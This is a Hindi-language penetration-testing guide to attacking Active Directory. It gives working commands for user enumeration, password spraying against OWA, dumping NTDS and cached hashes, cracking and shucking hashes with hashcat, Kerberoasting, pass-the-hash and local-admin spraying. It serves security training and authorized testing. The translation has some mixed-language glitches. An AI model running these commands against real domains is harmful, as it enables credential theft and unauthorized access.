# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## Basic overview

**Active Directory** एक बुनियादी तकनीक है जो **नेटवर्क प्रशासकों** को नेटवर्क के भीतर **domains**, **users**, और अन्य **objects** को कुशलतापूर्वक बनाने और प्रबंधित करने में सक्षम बनाती है। इसे स्केल होने के लिए डिज़ाइन किया गया है ताकि बड़ी संख्या में उपयोगकर्ताओं को मैनेजेबल **groups** और **subgroups** में व्यवस्थित किया जा सके और विभिन्न स्तरों पर **access rights** नियंत्रित किए जा सकें।

**Active Directory** की संरचना तीन प्रमुख परतों से मिलकर बनी है: **domains**, **trees**, और **forests**। एक **domain** उन objects का संग्रह होता है, जैसे **users** या **devices**, जो एक साझा डेटाबेस साझा करते हैं। **Trees** उन domains के समूह होते हैं जो एक साझा संरचना द्वारा जुड़े होते हैं, और एक **forest** कई trees का संग्रह होता है, जिन्हें **trust relationships** द्वारा जोड़ा गया होता है, जो संगठनात्मक संरचना की सर्वोच्च परत को बनाते हैं। विशिष्ट **access** और **communication rights** को इन सभी स्तरों पर निर्दिष्ट किया जा सकता है।

**Active Directory** के प्रमुख अवधारणाएँ शामिल हैं:

1. **Directory** – Active Directory objects से संबंधित सभी जानकारी को स्तोत्रित करता है।
2. **Object** – डायरेक्टरी के भीतर की इकाइयाँ, जिनमें **users**, **groups**, या **shared folders** शामिल हैं।
3. **Domain** – डायरेक्टरी ऑब्जेक्ट्स के लिए एक कंटेनर के रूप में कार्य करता है; एक **forest** के भीतर कई domains सह-अस्तित्व में रह सकते हैं, प्रत्येक का अपना ऑब्जेक्ट संग्रह होता है।
4. **Tree** – domains का एक समूह जो एक सामान्य root domain साझा करते हैं।
5. **Forest** – Active Directory में संगठनात्मक संरचना की शीर्ष परत, जो कई trees से मिलकर बनी होती है और उनके बीच **trust relationships** होते हैं।

**Active Directory Domain Services (AD DS)** केंद्रीय प्रबंधन और नेटवर्क भीतर संचार के लिए आवश्यक कई सेवाओं को समेटता है। इन सेवाओं में शामिल हैं:

1. **Domain Services** – डेटा भंडारण को केंद्रीकृत करता है और **users** और **domains** के बीच इंटरैक्शन का प्रबंधन करता है, जिसमें **authentication** और **search** कार्यक्षमताएँ शामिल हैं।
2. **Certificate Services** – सुरक्षित **digital certificates** के निर्माण, वितरण और प्रबंधन की देखरेख करता है।
3. **Lightweight Directory Services** – **LDAP protocol** के माध्यम से डायरेक्टरी-सक्षम एप्लिकेशन का समर्थन करता है।
4. **Directory Federation Services** – कई वेब एप्लिकेशन में एक ही सत्र में उपयोगकर्ताओं को प्रमाणित करने के लिए **single-sign-on** क्षमताएँ प्रदान करता है।
5. **Rights Management** – कॉपीराइट सामग्री की अनधिकृत वितरण और उपयोग को नियंत्रित करके उसकी सुरक्षा में मदद करता है।
6. **DNS Service** – **domain names** के रेज़ॉल्यूशन के लिए महत्वपूर्ण है।

अधिक विस्तृत जानकारी के लिए देखें: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

AD पर हमले करने के लिए आपको **Kerberos authentication process** को बहुत अच्छी तरह समझना होगा।\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Cheat Sheet

आप एक त्वरित नज़र के लिए कई कमांड्स और AD को enumerate/exploit करने हेतु आदेशों के लिए [https://wadcoms.github.io/](https://wadcoms.github.io) देख सकते हैं।

> [!WARNING]
> Kerberos communication **requires a full qualified name (FQDN)** क्रियाएँ करने के लिए। यदि आप किसी मशीन तक IP पते से पहुँचने का प्रयास करते हैं, **तो यह NTLM का उपयोग करेगा और Kerberos नहीं**।

## Recon Active Directory (No creds/sessions)

यदि आपके पास केवल AD पर्यावरण तक पहुँच है लेकिन कोई credentials/sessions नहीं हैं तो आप कर सकते हैं:

- **Pentest the network:**
- नेटवर्क को स्कैन करें, मशीनें और खुले पोर्ट ढूँढें और उन्हें **exploit vulnerabilities** या उनसे **extract credentials** करने की कोशिश करें (उदाहरण के लिए, [printers could be very interesting targets](ad-information-in-printers.md) हो सकते हैं)।
- DNS की enumeration से डोमेन के प्रमुख सर्वरों के बारे में जानकारी मिल सकती है जैसे वेब, printers, shares, vpn, media, आदि।
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- इस प्रकार के काम करने के बारे में और जानकारी पाने के लिए General [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) देखें।
- **Check for null and Guest access on smb services** (यह आधुनिक Windows संस्करणों पर काम नहीं करेगा):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- SMB सर्वर की enumeration पर एक विस्तृत गाइड यहाँ मिल सकती है:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- LDAP की enumeration पर एक विस्तृत गाइड यहाँ मिल सकती है (विशेष रूप से **anonymous access** पर ध्यान दें):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- [**Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) के साथ सेवाओं का impersonate करके credentials एकत्र करें
- [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) के जरिए host तक पहुँचें
- [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md) **exposing** करके credentials इकट्ठा करें और संदर्भ के लिए [**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856) देखें
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- आंतरिक दस्तावेज़ों, सोशल मीडिया, सेवाओं (मुख्यतः वेब) और सार्वजनिक रूप से उपलब्ध स्रोतों से usernames/names निकालें।
- यदि आपको कंपनी कर्मचारियों के पूरे नाम मिल जाते हैं, तो आप विभिन्न AD **username conventions** आजमा सकते हैं ( [**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/) )। सबसे सामान्य convention हैं: _NameSurname_, _Name.Surname_, _NamSur_ (प्रत्येक से 3 अक्षर), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123)।
- टूल्स:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) और [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) पृष्ठों की जाँच करें।
- **Kerbrute enum**: जब कोई **invalid username** मांगा जाता है तो सर्वर **Kerberos error** कोड _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_ के साथ प्रतिक्रिया देगा, जिससे हम यह निर्धारित कर सकते हैं कि username अमान्य था। **Valid usernames** पर या तो **TGT in a AS-REP** प्रतिक्रिया प्राप्त होगी या त्रुटि _KRB5KDC_ERR_PREAUTH_REQUIRED_ आएगी, जो संकेत देती है कि user को pre-authentication करने की आवश्यकता है।
- **No Authentication against MS-NRPC**: domain controllers पर MS-NRPC (Netlogon) इंटरफ़ेस के खिलाफ auth-level = 1 (No authentication) का उपयोग करना। यह तरीका MS-NRPC इंटरफ़ेस को bind करने के बाद `DsrGetDcNameEx2` फ़ंक्शन को कॉल करता है ताकि बिना किसी credentials के यह जाँच सके कि user या computer मौजूद है या नहीं। इस प्रकार की enumeration को लागू करने वाला टूल [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) है। इस शोध को यहाँ पाया जा सकता है: https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

यदि आपने नेटवर्क में इनमें से किसी सर्वर को पाया है, तो आप **user enumeration against it** भी कर सकते हैं। उदाहरण के लिए, आप टूल [**MailSniper**](https://github.com/dafthack/MailSniper) का उपयोग कर सकते हैं:
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> You can find lists of usernames in [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  and this one ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> However, you should have the **name of the people working on the company** from the recon step you should have performed before this. With the name and surname you could used the script [**namemash.py**](https://gist.github.com/superkojiman/11076951) to generate potential valid usernames.

### Knowing one or several usernames

ठीक है, तो आप जानते हैं कि आपके पास पहले से ही एक valid username है लेकिन कोई password नहीं... तो कोशिश करें:

- [**ASREPRoast**](asreproast.md): अगर किसी user के पास attribute _DONT_REQ_PREAUTH_ **नहीं है** तो आप उस user के लिए एक AS_REP message request कर सकते हैं जो कि यूज़र के password के derivative से encrypt किए गए कुछ data को 포함 करेगा।
- [**Password Spraying**](password-spraying.md): खोजे गए हर user के साथ सबसे सामान्य passwords आज़माएँ — शायद कोई user खराब password इस्तेमाल कर रहा हो (password policy का ध्यान रखें!)।
- ध्यान दें कि आप users के mail servers तक पहुँचने के लिए **OWA servers पर भी spray** कर सकते हैं।

{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

आप कुछ challenge **hashes** प्राप्त कर सकते हैं जिन्हें आप crack कर सकते हैं अगर आप नेटवर्क के कुछ protocols को **poison** कर पाते हैं:



{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

यदि आपने Active Directory का enumeration कर लिया है तो आपके पास **और अधिक emails और नेटवर्क की बेहतर समझ** होगी। आप NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) को मजबूर करके AD env में पहुँच हासिल कर सकते हैं।

### Steal NTLM Creds

यदि आप **null या guest user** के साथ दूसरे PCs या shares तक access कर पाते हैं तो आप ऐसी फाइलें (जैसे SCF file) **place** कर सकते हैं जो किसी तरह access होने पर **आपके खिलाफ NTLM authentication trigger करेंगी**, ताकि आप crack करने के लिए **NTLM challenge** **steal** कर सकें:



{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** हर NT hash को जो आपके पास पहले से है उस रूप में treat करता है जैसे वह दूसरे, slower formats के लिए candidate password हो जिनका key material सीधे NT hash से derive होता है। Kerberos RC4 tickets, NetNTLM challenges, या cached credentials में लंबे passphrases को brute-force करने के बजाय, आप NT hashes को Hashcat के NT-candidate modes में डालते हैं और बिना plaintext जाने password reuse validate करवा सकते हैं। यह विशेष रूप से domain compromise के बाद तब प्रभावी है जब आप हजारों current और historical NT hashes harvest कर लेते हैं।

Shucking का उपयोग करें जब:

- आपके पास DCSync, SAM/SECURITY dumps, या credential vaults से एक NT corpus हो और आपको अन्य domains/forests में reuse की जाँच करनी हो।
- आप RC4-based Kerberos material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses, या DCC/DCC2 blobs capture करते हैं।
- आप लंबे, uncrackable passphrases के reuse को जल्दी साबित करना चाहते हैं और तुरंत Pass-the-Hash (PtH) के जरिए pivot करना चाहते हैं।

यह technique उन encryption types पर काम नहीं करती जिनकी keys NT hash नहीं हैं (उदा., Kerberos etype 17/18 AES)। अगर कोई domain केवल AES-only लागू करता है, तो आपको regular password modes पर वापस जाना होगा।

#### Building an NT hash corpus

- **DCSync/NTDS** – सबसे बड़ी संभव सेट के NT hashes (और उनके previous values) प्राप्त करने के लिए `secretsdump.py` को history के साथ इस्तेमाल करें:

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History entries candidate pool को बहुत व्यापक बनाते हैं क्योंकि Microsoft प्रति account तक 24 previous hashes तक store कर सकता है। NTDS secrets harvest करने के और तरीकों के लिए देखें:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (या Mimikatz `lsadump::sam /patch`) local SAM/SECURITY data और cached domain logons (DCC/DCC2) निकालता है। उन hashes को deduplicate करके उसी `nt_candidates.txt` सूची में जोड़ें।
- **Track metadata** – प्रत्येक hash को उत्पन्न करने वाले username/domain को रखें (भले ही wordlist केवल hex ही हो)। Matching hashes आपको तुरंत बता देंगे कि किस principal ने password reuse किया है जब Hashcat जीतने वाला candidate प्रिंट करेगा।
- समान forest या trusted forest से candidates को प्राथमिकता दें; इससे shucking के दौरान overlap की संभावना बढ़ती है।

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate inputs **raw 32-hex NT hashes** ही रहें। rule engines disable करें (कोई `-r`, कोई hybrid modes नहीं) क्योंकि mangling candidate key material को corrupt कर देता है।
- ये modes स्वाभाविक रूप से तेज़ नहीं हैं, पर NTLM keyspace (~30,000 MH/s on an M3 Max) Kerberos RC4 (~300 MH/s) की तुलना में ~100× तेज़ है। curated NT list की जाँच slow format में पूरे password space को एक्सप्लोर करने से बहुत सस्ती पड़ती है।
- हमेशा **latest Hashcat build** चलाएँ (`git clone https://github.com/hashcat/hashcat && make install`) क्योंकि modes 31500/31600/35300/35400 हाल ही में आए हैं।
- वर्तमान में AS-REQ Pre-Auth के लिए कोई NT mode नहीं है, और AES etypes (19600/19700) को plaintext password की आवश्यकता होती है क्योंकि उनकी keys PBKDF2 से UTF-16LE passwords से derive होती हैं, raw NT hashes से नहीं।

#### Example – Kerberoast RC4 (mode 35300)

1. किसी target SPN के लिए RC4 TGS capture करें एक low-privileged user से (विस्तार के लिए Kerberoast page देखें):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. अपने NT list के साथ ticket को shuck करें:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat प्रत्येक NT candidate से RC4 key derive करता है और `$krb5tgs$23$...` blob को validate करता है। एक match यह पुष्टि करता है कि service account आपके मौजूद NT hashes में से एक का उपयोग कर रहा है।

3. तुरंत PtH के जरिए pivot करें:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

आप बाद में plaintext को recover कर सकते हैं अगर जरूरत हो तो `hashcat -m 1000 <matched_hash> wordlists/` से।

#### Example – Cached credentials (mode 31600)

1. किसी compromised workstation से cached logons dump करें:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. दिलचस्प domain user के लिए DCC2 line को `dcc2_highpriv.txt` में copy करें और shuck करें:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. सफल match यह सिद्ध करता है कि cached user पहले से ज्ञात NT hash का reuse कर रहा है। इसे सीधे PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) के लिए उपयोग करें या fast NTLM mode में brute-force करके string recover करें।

सही वही workflow NetNTLM challenge-responses (`-m 27000/27100`) और DCC (`-m 31500`) पर लागू होता है। एक बार match पहचान लिया गया तो आप relay, SMB/WMI/WinRM PtH लॉन्च कर सकते हैं, या offline masks/rules के साथ NT hash को फिर से crack कर सकते हैं।

## Enumerating Active Directory WITH credentials/session

इस चरण के लिए आपको किसी valid domain account के credentials या session को **compromise** करना होगा। अगर आपके पास कुछ valid credentials हैं या domain user के रूप में shell है, तो **पहले दी गई विकल्पें अन्य users को compromise करने के लिए अभी भी उपलब्ध हैं**।

authenticated enumeration शुरू करने से पहले आपको **Kerberos double hop problem** क्या होता है यह समझना चाहिए।


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

किसी account को compromise करना पूरे domain को compromise करने की शुरुआत के लिए एक **बड़ा कदम** है, क्योंकि आप Active Directory Enumeration शुरू कर पाएंगे:

[**ASREPRoast**](asreproast.md) के संदर्भ में आप अब हर संभावित vulnerable user को खोज सकते हैं, और [**Password Spraying**](password-spraying.md) के संदर्भ में आप सभी usernames की सूची पा कर compromised account का password, खाली passwords और नए promising passwords आज़मा सकते हैं।

- आप बेसिक recon करने के लिए [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info) इस्तेमाल कर सकते हैं
- आप stealthier recon के लिए [**powershell for recon**](../basic-powershell-for-pentesters/index.html) का भी उपयोग कर सकते हैं
- आप और अधिक detailed जानकारी निकालने के लिए [**powerview**](../basic-powershell-for-pentesters/powerview.md) भी उपयोग कर सकते हैं
- Active Directory में recon के लिए एक और शानदार tool है [**BloodHound**](bloodhound.md). यह **बहुत stealthy नहीं है** (यह उस collection methods पर निर्भर करता है जो आप उपयोग करते हैं), पर **अगर आपको इसकी परवाह नहीं है** तो आपको इसे ज़रूर आज़माना चाहिए। जहाँ users RDP कर सकते हैं वह ढूँढें, अन्य groups तक paths खोजें, आदि।
- **अन्य automated AD enumeration tools हैं:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) देखें क्योंकि उनमें दिलचस्प जानकारी हो सकती है।
- GUI वाला एक tool जो आप directory enumerate करने के लिए उपयोग कर सकते हैं वह **AdExplorer.exe** है जो **SysInternal** Suite से है।
- आप ldapsearch के साथ LDAP database को search कर सकते हैं ताकि _userPassword_ & _unixUserPassword_ फील्ड्स या यहां तक कि _Description_ में credentials ढूँढ सकें। अन्य तरीकों के लिए cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment)।
- अगर आप **Linux** उपयोग कर रहे हैं, तो आप domain enumerate करने के लिए [**pywerview**](https://github.com/the-useless-one/pywerview) भी इस्तेमाल कर सकते हैं।
- आप automated tools भी आज़मा सकते हैं जैसे:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **सभी domain users को extract करना**

Windows से सभी domain usernames प्राप्त करना बहुत आसान है (`net user /domain` ,`Get-DomainUser` या `wmic useraccount get name,sid`). Linux में आप उपयोग कर सकते हैं: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` या `enum4linux -a -u "user" -p "password" <DC IP>`

> भले ही यह Enumeration section छोटा दिखता हो, यह सबसे महत्वपूर्ण हिस्सा है। links (मुख्य रूप से cmd, powershell, powerview और BloodHound वाले) खोलें, सीखें कि domain को कैसे enumerate करें और अभ्यास करें जब तक आप सहज महसूस न कर लें। एक assessment के दौरान, यह वह मुख्य क्षण होगा जब आप DA तक पहुँचने का मार्ग पाएंगे या यह निर्णय लेंगे कि कुछ नहीं किया जा सकता।

### Kerberoast

Kerberoasting में services से जुड़ी user accounts द्वारा उपयोग किए जाने वाले **TGS tickets** प्राप्त करना और उनकी encryption (जो user passwords पर आधारित है) को offline crack करना शामिल है।

इस विषय पर और पढ़ें:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

कुछ credentials प्राप्त करने के बाद आप यह चेक कर सकते हैं कि क्या आपके पास किसी भी **machine** तक access है। इस उद्देश्य के लिए, आप विभिन्न protocols के साथ कई servers पर connect करने का प्रयास करने के लिए **CrackMapExec** का उपयोग कर सकते हैं, अपनी port scans के अनुसार।

### Local Privilege Escalation

यदि आपने credentials या session को एक regular domain user के रूप में compromise कर लिया है और इस user से किसी भी domain machine तक आपकी **access** है, तो आपको स्थानीय स्तर पर privileges escalate करने और credentials loot करने का प्रयास करना चाहिए। ऐसा इसलिए क्योंकि केवल local administrator privileges के साथ आप अन्य users के hashes को memory (LSASS) और locally (SAM) में dump कर पाएँगे।

इस book में [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) के बारे में एक पूर्ण पेज है और एक [**checklist**](../checklist-windows-privilege-escalation.md) भी है। साथ ही, [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) का उपयोग करना न भूलें।

### Current Session Tickets

यह बहुत ही **असंभव** है कि आप current user में ऐसे **tickets** पाएँ जो आपको unexpected resources तक पहुँच देने की अनुमति दें, पर आप यह जाँच सकते हैं:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

यदि आप Active Directory का enumeration करने में सफल रहे हैं तो आपके पास **अधिक ईमेल और नेटवर्क की बेहतर समझ** होगी। आप NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) को फोर्स करने में भी सक्षम हो सकते हैं।**

### Computer Shares में Creds खोजें | SMB Shares

अब जब आपके पास कुछ basic credentials हैं तो आपको चेक करना चाहिए कि क्या आप AD के अंदर शेयर की जा रही किसी भी **interesting files** को **find** कर सकते हैं। आप यह मैन्युअली कर सकते हैं लेकिन यह बहुत नीरस और repetitive काम है (और ज़्यादा यदि आपको सैकड़ों docs मिलते हैं जिन्हें आपको जांचना होता है)।

[**इन टूल्स के बारे में जानने के लिए इस लिंक का पालन करें।**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### NTLM Creds चुराएं

यदि आप अन्य PCs या shares तक **access** कर सकते हैं तो आप ऐसी **files** रख सकते हैं (जैसे SCF file) जो यदि किसी तरह access होंगी तो यह आपके खिलाफ **NTLM authentication trigger** करेंगी ताकि आप **NTLM challenge** को **steal** कर सकें और उसे crack कर सकें:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

इस vulnerability ने किसी भी authenticated user को **domain controller compromise** करने की अनुमति दी।


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**निम्नलिखित techniques के लिए एक सामान्य domain user पर्याप्त नहीं है, इन attacks को करने के लिए आपको कुछ विशेष privileges/credentials की आवश्यकता होगी।**

### Hash extraction

आशा है कि आप [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) (relaying सहित), [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html) का उपयोग करके कुछ local admin account compromise करने में सफल रहे होंगे।\
फिर, अब समय है कि memory और local पर सभी hashes को dump करने का।\
[**हैश प्राप्त करने के विभिन्न तरीकों के बारे में इस पेज को पढ़ें।**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**एक बार जब आपके पास किसी user का hash हो**, आप इसका उपयोग उसे **impersonate** करने के लिए कर सकते हैं।\
आपको किसी ऐसे **tool** का उपयोग करना होगा जो उस **hash** का उपयोग करके **NTLM authentication perform** करे, **या** आप नया **sessionlogon** बना कर वह **hash** **LSASS** के अंदर **inject** कर सकते हैं, ताकि जब कोई भी **NTLM authentication** perform हो, तो वह **hash** उपयोग किया जाए। आखिरी विकल्प वही है जो mimikatz करता है।\
[**अधिक जानकारी के लिए इस पेज को पढ़ें।**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

यह attack user NTLM hash का उपयोग करके Kerberos tickets request करने का लक्ष्य रखता है, जो सामान्य Pass The Hash over NTLM protocol का एक विकल्प है। इसलिए, यह उन नेटवर्कों में विशेष रूप से उपयोगी हो सकता है जहाँ NTLM protocol disabled है और केवल Kerberos को authentication protocol के रूप में allow किया गया है।


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Pass The Ticket (PTT) attack method में, attackers किसी user का authentication ticket चुराते हैं, उनके password या hash values के बजाय। यह चुराया हुआ ticket फिर user को **impersonate** करने के लिए उपयोग किया जाता है, जिससे नेटवर्क के भीतर resources और services तक unauthorized access मिल जाती है।


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

यदि आपके पास किसी local administrator का **hash** या **password** है तो आपको इसके साथ अन्य **PCs** पर **locally login** करने की कोशिश करनी चाहिए।
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> ध्यान दें कि यह काफी **शोरगुल** करता है और **LAPS** इसे **कम** कर देगा।

### MSSQL Abuse & Trusted Links

यदि किसी उपयोगकर्ता के पास **access MSSQL instances** की privileges हैं, तो वह इसका उपयोग MSSQL होस्ट पर **execute commands** करने के लिए कर सकता है (यदि यह SA के रूप में चल रहा हो), NetNTLM **hash** को **steal** कर सकता है या यहाँ तक कि एक **relay attack** भी कर सकता है.\
इसके अलावा, यदि एक MSSQL instance को किसी दूसरे MSSQL instance द्वारा trusted (database link) किया गया है और उपयोगकर्ता के पास trusted database पर privileges हैं, तो वह **use the trust relationship to execute queries also in the other instance** करने में सक्षम होगा। ये trusts chain हो सकते हैं और किसी बिंदु पर उपयोगकर्ता एक misconfigured database ढूंढ सकता है जहाँ वह commands execute कर सके।\
**Databases के बीच के लिंक forest trusts के पार भी काम करते हैं।**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Third-party inventory और deployment suites अक्सर credentials और code execution तक पहुंचने के लिए शक्तिशाली रास्ते expose करती हैं। देखें:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

यदि आप किसी Computer object को attribute [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) के साथ पाते हैं और उस कंप्यूटर पर आपके पास domain privileges हैं, तो आप उस कंप्यूटर पर लॉगिन करने वाले हर उपयोगकर्ता की memory से TGTs dump कर पाएंगे।\
इसलिए, यदि कोई **Domain Admin** उस कंप्यूटर पर लॉगिन करता है, तो आप उसका TGT dump करके [Pass the Ticket](pass-the-ticket.md) का उपयोग करके उसकी impersonate कर सकते हैं।\
constrained delegation की वजह से आप **स्वचालित रूप से एक Print Server compromise** भी कर सकते हैं (आशा है कि वह DC होगा)।

{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

यदि किसी user या computer को "Constrained Delegation" की अनुमति है तो वह किसी कंप्यूटर पर कुछ services में access करने के लिए **impersonate any user to access some services in a computer** कर सकेगा।\
फिर, यदि आप उस user/computer का **hash compromise** कर लेते हैं तो आप किसी भी user (यहाँ तक कि domain admins) की **impersonate** करके कुछ services में access कर सकेंगे।

{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

किसी remote computer के Active Directory object पर **WRITE** privilege होना elevated privileges के साथ code execution हासिल करने में सक्षम बनाता है:

{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

